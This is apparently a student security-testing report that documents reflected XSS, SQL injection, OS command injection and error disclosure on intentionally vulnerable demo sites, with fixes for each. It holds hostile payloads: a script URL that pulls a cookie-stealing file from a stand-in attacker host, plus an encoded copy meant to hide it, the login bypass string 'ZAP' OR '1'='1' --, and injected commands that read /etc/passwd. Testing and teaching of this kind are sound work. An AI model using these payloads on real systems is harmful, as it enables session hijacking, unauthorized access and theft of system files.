# IS2545 - DELIVERABLE 5: Security Testing
## Author: Huizhi Zhong(huz25), Ting Li(til42)

## Vulnerability 1: Cross Site Scripting (Reflected)

### 1.1. Vulnerability description
Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance.

It attacks confidentiality and integrity as unauthorized user can get password from users’ session to log in and then read and write data.

Interception, modification and fabrication can exploit this vulnerability. The attacker may gain access to users or administrator cookies, session IDs, passwords, private messages etc. They can read and access the content of a page for any attacked user (interception), modify users’ information such as password and add new user accounts(fabrication).

If attacker didn’t get user’s username and password from the session, then it is passive as the attacker eavesdrops users’ activity. If attacker get user’s username and password from the session, then it is active as the attacker log in as a different user to read and write data.

Business value would be lost: Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site, and the company will lose its reputation. If attacker get password of administrator, then it will cause data loss and unauthorized access.

### 1.2. Steps for development team taken to fix this vulnerability
   1. Perform input validation and consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. Guarantee that the pages in the Web site return user inputs only after validating them for any malicious code. 
   2. Convert all non-alphanumeric characters to HTML character entities before displaying the user input in search engines and forums.
   3. Use testing tools extensively during the design phase to eliminate such XSS holes in the application before it goes into use.


### 1.3. The URL of the website with the described vulnerability
     http://demo.testfire.net/


### 1.4. Steps taken to exploit the vulnerability
   1. Attacker observes that http://demo.testfire.net/ website contains a reflected XSS vulnerability: User can input a search term in the search box and clicks the submit button and the url will be http://demo.testfire.net/search.aspx?txtSearch=***
   2. The attacker crafts a URL to exploit the vulnerability by making the URL http://demo.testfire.net/search.aspx?txtSearch=searchitem<script%20src="http://mallorysevilsite.com/authstealer.js"></script> which will run the js file to grab users’ information. Then attacker encodes this URL to http://demo.testfire.net/search.aspx?txtSearch=searchitem%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E, so that user cannot immediately decipher the malicious URL.
   3. Attacker sends the link to some unsuspecting members of this website. When user clicks on the link, it goes to the website to search, right in the middle, the script tag runs (it is invisible on the screen) and loads and runs authstealer.js (triggering the XSS attack). 
   4. The authstealer.js program runs in user's browser, and it grabs a copy of user's Authorization Cookie and sends it to attacker's server, where attacker retrieves it.
   5. Attacker now puts user’'s Authorization Cookie into his browser as if it were his own to log in as another user and then read and write the user’s data. Condition will be worse if attacker get administrator’s password.

The screenshot follows the steps of what OWASP ZAP does

![v1xss1](https://cloud.githubusercontent.com/assets/16599342/20375511/973a8fb2-ac4d-11e6-804d-25dbacad5fba.png)

![v1xss2](https://cloud.githubusercontent.com/assets/16599342/20375510/973a4750-ac4d-11e6-9f00-a4c139b21b69.png)




## Vulnerability 2:  SQL Injection

### 2.1. Vulnerability description
The vulnerability is detected by successfully retrieving more data than originally returned, by manipulating the parameter

It attacks confidentiality and integrity because attackers which is unauthorized user can log in admin account to read and write data. 

Interception, Modification and Fabrication can exploit this vulnerability. After logging as an administrator, attacker can view application Information and user information (Interception);  transfer funds and change user's password (Modification) and add a new user (Fabrication).

Attacks that exploit this vulnerability is active because attacker log in as administrator and modify bank account information.

Business value would be lost:Exploiting this vulnerability would due to data loss and unauthorized access. When attacker is able to log in as an administrator, customers’ information are stolen which will affect public image of the company and result in noticeable profit loss. 

### 2.2. Steps for development team taken to fix this vulnerability
   1. Adopt an input validation technique in which user input is authenticated against a set of defined rules for length, type and syntax and also against business rules.
   2. Development team should ensure that users with the permission to access the database have the least privileges. Additionally, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.
   3. Also, you should always make sure that a database user is created only for a specific application and this user is not able to access other applications. 
   4. Remove all stored procedures that are not in use. Use strongly typed parameterized query APIs with placeholder substitution markers, even when calling stored procedures. Show care when using stored procedures since they are generally safe from injection. However, be careful as they can be injectable (such as via the use of exec() or concatenating arguments within the stored procedure).

### 2.3. The URL of the website with the described vulnerability
     http://demo.testfire.net/bank/login.aspx

### 2.4. Steps taken to exploit the vulnerability
   1. Go to login page of the website http://demo.testfire.net/bank/login.aspx
   2. Type “ZAP” as username, “ZAP' OR '1'='1' --” as password.
   3. Successfully log in as administrator to view and edit users’ information.

A screenshot of the vulnerability
![v2sql1](https://cloud.githubusercontent.com/assets/16599342/20375512/973b2774-ac4d-11e6-8b3d-8c73d7805dec.png)
<img width="1440" alt="v2sql2" src="https://cloud.githubusercontent.com/assets/16599342/20375513/973bb950-ac4d-11e6-91fb-73cf2551b03a.png">




## Vulnerability 3: Remote OS command injection

### 3.1. Vulnerability description
Remote OS command injection is an attack technique that user can supply operating system commands through a web interface in order to execute OS commands on a web server. This vulnerability can seduce attack on the confidentiality and integrity of system as an attacker can inject extra shell commands and have the application run them under the privileges of the web-server, and these commands can achieve unauthorized read and write. 

Interruption, Interception and Modification can exploit this vulnerability. Injecting code to disrupt services of a host connected to the Internet, resulting in Denial-of-service attack(Interruption); attacker can obtain the password through command injection to monitor user behevior (interception); upload malicious code which could modify or deleting data on the web server (Modification).

Referring to the aforementioned ways of exploiting this vulnerability, we can see the attacks can be both active and passive.  

Business value would be lost: Reputation damage would occur if user data is modified or deleted by attacker through os command injection. Moreover, all data could be stolen by attacker, where resides business value, which would incur financial damage.   

### 3.2. Steps for development team taken to fix this vulnerability
   1. Perform input validation by considering all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. When constructing OS command strings, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. 
   2. Proper output encoding, escaping, and quoting, which can effectively limits what will appear in the output,  is the most effective solution for preventing OS command injection. Although input validation may provide some defense-in-depth. It will not always prevent OS command injection, especially if the application is required to support free-form text fields that could contain arbitrary characters. In this case, stripping the character might reduce the risk of OS command injection, but it would produce incorrect behavior because the subject field would not be recorded as the user intended.
   3. Apart from dealing with the input and output carefully, development team can make the code run in a sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by your software. For any data that will be used to generate a command to be executed, keep as much of that data out of external control as possible. 

### 3.3. The URL of the website with the described vulnerability
     http://www.webscantest.com/osrun/whois.php   
     
### 3.4. Steps taken to exploit the vulnerability
   1. Enter the URL provided above
   2. Enter any of the following unix command below,  they can all be executed under the privileges of the web-server
       (;cat /proc/cpuinfo
       ;cat /etc/passwd
       ;cat id
       ;uname -a
       ;pwd
      ;ls /tmp)

For example, if I entered ;cat /etc/passwd 
<img width="1342" alt="os1" src="https://cloud.githubusercontent.com/assets/16599342/20375523/a785d4ee-ac4d-11e6-8fdd-40a0d0718944.png">

Result as follow is obtained
<img width="1338" alt="os4" src="https://cloud.githubusercontent.com/assets/16599342/20375525/a78fcb20-ac4d-11e6-9d81-4c195ac99555.png">

If I entered ;cat /proc/cpuinfo
<img width="1091" alt="os3" src="https://cloud.githubusercontent.com/assets/16599342/20375526/a790467c-ac4d-11e6-80be-6fb75410ec85.png">

Result as follow is obtained
<img width="1092" alt="os2" src="https://cloud.githubusercontent.com/assets/16599342/20375524/a78fb7ca-ac4d-11e6-9c09-10d0a0e5f4be.png">


## Vulnerability 4:  Application Error Disclosure
### 4.1. Vulnerability description
Web applications will often leak information about their internal state through detailed or debug error messages. This vulnerability attack confidentiality because the application error disclosure reveal sensitive information like the location of the file that produced the unhandled exception which unauthorized user should not know. 

This error information can be leveraged to launch or even automate more powerful attacks. Depending on what kind of information the attacker finally obtained by exploring this vulnerability,  interception attack or even modification is possible.

The attacks that exploit this vulnerability are passive, because attacker mainly exploited to read information to which they are unauthorized. 

Business value would be lost: Organization is exposed to the risk of leaking out important information or even classified information. For example, if an important  research outcome is leaked out,  company will suffer from financial damage. Privacy violation is of high probability. 

### 4.2. Steps for development team taken to fix this vulnerability
   1. Implement a mechanism to provide a unique error reference/identifier to the client while logging the details on the server side and not exposing them to the user.
 
### 4.3. The URL of the website with the described vulnerability
     http://demo.testfire.net/default.aspx?content=personal_savings.htm 

### 4.4. Steps taken to exploit the vulnerability
   1. Assume username and password of administrator are leaked through error message
   2. The attacker login in using the leaked information
   3. Attacker can then manipulate the website information easily

This vulnerability resides in the website is stack traces, which is a structured error message that begins with a description of the actual error. The top line of the call stack shows the function that generated the error, the next line shows the function that invoked the previous function, and so on down the call stack until the hierarchy of function calls is exhausted. Although it didn’t leak sensitive information directly as I assumed in the previous step, this may enable attacker to adjust their input to avoid the error condition and advance their attack. The call stack includes the names of the proprietary code components being used to process the request. The naming scheme for these and the interrelationships between them may allow attacker to infer details about the internal structure and functionality of the application.

<img width="1434" alt="error" src="https://cloud.githubusercontent.com/assets/16599342/20375522/a77ad882-ac4d-11e6-8038-9a9e25459e0d.png">

